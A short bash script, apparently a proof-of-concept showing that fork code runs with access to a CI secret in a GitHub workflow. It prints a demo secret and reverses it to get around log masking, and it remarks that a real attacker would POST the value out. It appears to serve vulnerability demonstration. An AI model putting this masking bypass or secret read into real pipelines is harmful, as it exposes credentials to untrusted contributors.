#!/usr/bin/env bash
echo "=== FORK CODE EXECUTED IN BASE (SECRET-BEARING) CONTEXT ==="
echo "Raw value (GitHub masks this in logs): $DEMO_SECRET"
echo "Proof of access -- length  : ${#DEMO_SECRET}"
echo "Proof of access -- reversed: $(printf '%s' "$DEMO_SECRET" | rev)"
echo "A real attacker exfiltrates this over the network; log-masking does NOT prevent an outbound POST."
